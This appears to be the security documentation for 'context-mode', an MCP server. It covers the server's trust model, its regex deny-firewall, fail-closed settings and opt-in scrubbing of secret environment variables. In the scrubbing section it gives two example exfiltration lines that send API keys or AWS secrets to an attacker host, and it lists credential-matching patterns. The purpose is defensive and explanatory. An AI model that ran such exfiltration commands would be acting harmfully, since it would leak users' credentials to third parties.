# Security

> Trust model, defense-in-depth layers, and operator-facing security knobs
> for context-mode. The current threat model assumes a **trusted local MCP
> client** — the deny-firewall is a best-effort guardrail, **not an
> isolation boundary**.

## Trust model

context-mode is a **stdio MCP server**. It does not open any inbound network
listener. Every request originates from a local process the operator already
trusts (Claude Code, Cursor, Codex, etc.). There is no tenant model and no
remote auth surface — those pillars are marked `n/a` in the architecture
audit for that reason.

What context-mode DOES do, and what the rest of this document covers:

1. **Sandboxed execution of user-supplied code** (12 languages) via
   `child_process.spawn` (`src/executor.ts::PolyglotExecutor`).
2. **Command-policy enforcement** before every execute / execute_file /
   batch_execute call (`src/security.ts::evaluateCommandDenyOnly` and
   `evaluateCommandStrict`).
3. **Project-containment** for `Read` / `Grep` — denies out-of-project
   access unless the host's `permissions.allow` explicitly opens it
   (`src/security.ts::evaluateProjectContainment`).
4. **Externalization** of >100 KB outputs to an FTS5/BM25 SQLite store, so
   the in-context window cannot be a denial-of-service target.

## What the deny-firewall is — and is not

| It IS                                                         | It is NOT                                              |
| ------------------------------------------------------------- | ------------------------------------------------------ |
| A regex-based best-effort guard against known dangerous cmds. | An OS-level sandbox (no seatbelt / firejail / cgroup). |
| A test-covered defense (`tests/security/`, `deny-policy.test.ts`). | A complete allowlist of every "safe" command.    |
| Skipping chained commands and `$()` / backtick subshells.     | A semantic shell parser — it can be bypassed by runtime-constructed command strings. |
| Fail-closed by default (opt-in fail-open via env var).        | Cryptographically isolated.                             |

Practical implication: **any code that passes the deny check still runs at
full user privilege with the parent process's environment**. A buggy or
malicious script that gets through the regex gate can read every secret in
`process.env`. The mitigations below reduce — but do not eliminate — that
blast radius.

## Security posture (configurable, default-closed)

The deny check is **fail-closed** by default. If a project root or boundary
is unresolvable (I/O error, permissions, settings file corruption), the
deny gate **denies** the command and returns a `posture=closed` error
message instructing the operator to fix the underlying issue or opt in to
fail-open.

| Env var                          | Default | Effect                                                               |
| -------------------------------- | ------- | -------------------------------------------------------------------- |
| `CONTEXT_MODE_FAIL_OPEN=1`       | `closed` | Set OPEN only when the surrounding host already enforces the same deny list (e.g. Claude Code hooks). The MCP server becomes a second-line defense. |
| `CONTEXT_MODE_STRICT_MODE=1`     | off     | Switches the gate from `evaluateCommandDenyOnly` (default-allow if not explicitly denied) to `evaluateCommandStrict` (deny unless every segment matches an explicit `permissions.allow` glob). |
| `CONTEXT_MODE_SUPPRESS_SECURITY_WARNING=1` | off | Suppresses the startup banner that reminds operators the deny-firewall is not a sandbox. Intended for CI / smoke tests only. |

The default posture is correct for every deployment where the surrounding
hooks are NOT configured. The audit-backlog items #1 and #2 (strict
allowlist + configurable fail-closed) are both shipped and tested.

## Secret-env scrubbing (opt-in)

`PolyglotExecutor` strips a curated denylist of env vars that corrupt
sandbox stdout, inject code, or break language runtimes (Bash `BASH_ENV`,
`SHELLOPTS`; Node `NODE_OPTIONS`; Python `PYTHONSTARTUP`; Ruby `RUBYOPT`;
.NET profiler CLSIDs; `LD_PRELOAD`; `DYLD_INSERT_LIBRARIES`; etc. — see
`src/executor.ts::buildSandboxEnv` for the full set and CVE references).

In addition, `CONTEXT_MODE_STRIP_SECRET_ENV=1` activates an opt-in
secret-name + secret-value scrubber that removes, from the spawned
child's environment, any var whose **name** matches common credential
patterns (`*_KEY`, `*_TOKEN`, `*_SECRET`, `*_PASSWORD`, `*_AUTH`, `AWS_*`,
`GITHUB_*`, `OPENAI_*`, `ANTHROPIC_*`, …) or whose **value** matches known
high-entropy secret formats (`sk-…`, `sk-ant-…`, `ghp_…`, `xox[bpars]-…`,
`AKIA[0-9A-Z]{16}`, JWT three-segment, Stripe `sk_live_…`, SendGrid
`SG.*.*`). Default is **OFF** for back-compat — existing operators' tool
chains may rely on inherited envs.

This is **defense in depth, not isolation**. A script that calls `curl
https://attacker.example/?d=$OPENAI_API_KEY` after the user pastes
`OPENAI_API_KEY=sk-…` in their shell will still exfiltrate it through
shell-history, terminal scrollback, or any other side channel. What
`CONTEXT_MODE_STRIP_SECRET_ENV=1` defends against is the **inadvertent
leak**: a benign-looking code snippet that quietly does
`fetch("https://attacker/" + process.env.AWS_SECRET_ACCESS_KEY)`.

To activate in CI / production:

```sh
export CONTEXT_MODE_STRIP_SECRET_ENV=1
```

The setting is read once per spawn, not once per session — toggling it at
runtime takes effect on the next `ctx_execute` call.

## Reporting a vulnerability

context-mode is published under the **Elastic License 2.0** (source-available,
not OSI-approved). For responsible disclosure, file a private issue at
<https://github.com/KooshaPari/context-mode/issues/security> or email the
maintainer (see `package.json` `author` field). Please do not disclose
publicly until a fix is shipped.

## Scope of this document

This page covers the **runtime** security model (sandbox, deny-firewall,
env handling). It does not cover:

- Plugin manifest signing and `plugin-cache-integrity` (see `src/`).
- Webhook HMAC signing (`src/lib/webhookDispatcher.ts`).
- MCP server scope tokens and audit log (see `src/middleware/`).

Those have their own per-component docs.
